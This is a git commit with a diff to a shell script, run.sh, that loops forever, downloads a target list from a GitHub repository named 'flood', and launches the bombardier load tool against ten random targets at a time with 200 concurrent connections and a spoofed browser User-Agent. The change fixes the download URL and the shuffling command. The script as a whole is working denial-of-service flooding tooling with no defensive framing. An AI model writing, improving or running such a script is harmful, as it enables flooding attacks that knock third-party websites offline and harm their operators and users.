533c67b89f057041d3944d5c46197e4700998a86
Anton Klyba <antonklyba@pingidentity.com>
2022-02-27 12:43:23 +0200

    fix

--- run.sh
+++ run.sh
@@ -2,8 +2,8 @@
 
 while true
 do
-    wget -O /app/targets.txt https://github.com/Anarhyst266/flood/blob/master/targets.txt
-    cat /app/targets.txt |sort -R --random-source=/dev/urandom | tail -n 10 | while read line
+    wget -O /app/targets.txt https://raw.githubusercontent.com/Anarhyst266/flood/master/targets.txt
+    cat /app/targets.txt |shuf | tail -n 10 | while read line
     do
         bombardier -c 200 -d 60s -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" -q ${line} &
     done
